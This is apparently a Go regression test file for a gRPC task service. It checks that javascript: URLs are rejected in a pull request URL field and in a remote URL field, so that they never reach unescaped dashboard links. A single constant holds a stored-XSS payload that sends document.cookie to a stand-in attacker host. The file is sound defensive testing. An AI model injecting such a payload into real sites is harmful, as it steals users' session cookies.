package server_test

import (
	"context"
	"testing"

	pb "github.com/farmtable-io/farmtable/api/farmtable/v1"
	"github.com/farmtable-io/farmtable/internal/testutil"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/status"
)

const xssPayload = "javascript:fetch('//attacker/'+document.cookie)"

// newTaskForURLTest creates a collection and a task to update.
func newTaskForURLTest(t *testing.T, client pb.FarmTableServiceClient) string {
	t.Helper()
	collID := createTestCollection(t, client)
	created, err := client.CreateTask(context.Background(), &pb.CreateTaskRequest{
		CollectionId: collID,
		Name:         "url validation test",
	})
	if err != nil {
		t.Fatalf("CreateTask: %v", err)
	}
	return created.GetId()
}

// TestRPC_UpdateTask_RejectsScriptURLInPullRequest pins the traced attack path:
// the PullRequest.url field reaches an unescaped href in the dashboard
// (web/src/components/inspector/ft-inspector-code.ts).
//
// Note that testutil.NewTestServer registers the service with NO gRPC
// interceptors, which is structurally identical to the CLI pass-through
// registration in internal/cli/connect.go. A fix implemented as an interceptor
// would not be exercised here at all, so this test is a real check that the
// validation lives on the service method itself.
func TestRPC_UpdateTask_RejectsScriptURLInPullRequest(t *testing.T) {
	client, cleanup := testutil.NewTestServer(t)
	defer cleanup()
	ctx := context.Background()

	taskID := newTaskForURLTest(t, client)

	_, err := client.UpdateTask(ctx, &pb.UpdateTaskRequest{
		Id: taskID,
		AddPullRequests: []*pb.PullRequest{{
			Id:     "1",
			Url:    xssPayload,
			Status: pb.PullRequestStatus_PULL_REQUEST_STATUS_OPEN,
		}},
	})
	if err == nil {
		t.Fatalf("UpdateTask accepted %q in add_pull_requests.url, want InvalidArgument", xssPayload)
	}
	st, _ := status.FromError(err)
	if st.Code() != codes.InvalidArgument {
		t.Errorf("code = %v, want InvalidArgument (err=%v)", st.Code(), err)
	}

	// The payload must not have been persisted.
	got, err := client.GetTask(ctx, &pb.GetTaskRequest{Id: taskID})
	if err != nil {
		t.Fatalf("GetTask: %v", err)
	}
	for _, pr := range got.GetTask().GetCodeContext().GetPullRequests() {
		if pr.GetUrl() == xssPayload {
			t.Errorf("payload was persisted despite rejection: %q", pr.GetUrl())
		}
	}
}

// TestRPC_UpdateTask_RejectsScriptURLInRemoteURL pins the second live URL field.
// remote_url reaches an unescaped href in
// web/src/components/inspector/ft-inspector-meta.ts.
func TestRPC_UpdateTask_RejectsScriptURLInRemoteURL(t *testing.T) {
	client, cleanup := testutil.NewTestServer(t)
	defer cleanup()
	ctx := context.Background()

	taskID := newTaskForURLTest(t, client)

	payload := xssPayload
	_, err := client.UpdateTask(ctx, &pb.UpdateTaskRequest{
		Id:        taskID,
		RemoteUrl: &payload,
	})
	if err == nil {
		t.Fatalf("UpdateTask accepted %q in remote_url, want InvalidArgument", payload)
	}
	st, _ := status.FromError(err)
	if st.Code() != codes.InvalidArgument {
		t.Errorf("code = %v, want InvalidArgument (err=%v)", st.Code(), err)
	}

	got, err := client.GetTask(ctx, &pb.GetTaskRequest{Id: taskID})
	if err != nil {
		t.Fatalf("GetTask: %v", err)
	}
	if got.GetTask().GetRemoteUrl() == payload {
		t.Errorf("payload was persisted despite rejection: %q", got.GetTask().GetRemoteUrl())
	}
}

// TestRPC_UpdateTask_AcceptsHTTPURLs is the control: the fix must not break
// legitimate URLs on either field.
func TestRPC_UpdateTask_AcceptsHTTPURLs(t *testing.T) {
	client, cleanup := testutil.NewTestServer(t)
	defer cleanup()
	ctx := context.Background()

	taskID := newTaskForURLTest(t, client)

	prURL := "https://github.com/ptone/farmtable/pull/7"
	remoteURL := "http://example.com/issues/9"

	updated, err := client.UpdateTask(ctx, &pb.UpdateTaskRequest{
		Id:        taskID,
		RemoteUrl: &remoteURL,
		AddPullRequests: []*pb.PullRequest{{
			Id:     "7",
			Url:    prURL,
			Status: pb.PullRequestStatus_PULL_REQUEST_STATUS_OPEN,
		}},
	})
	if err != nil {
		t.Fatalf("UpdateTask rejected legitimate URLs: %v", err)
	}
	if updated.GetRemoteUrl() != remoteURL {
		t.Errorf("remote_url = %q, want %q", updated.GetRemoteUrl(), remoteURL)
	}
	prs := updated.GetCodeContext().GetPullRequests()
	if len(prs) != 1 || prs[0].GetUrl() != prURL {
		t.Errorf("pull_requests = %v, want one PR with url %q", prs, prURL)
	}
}
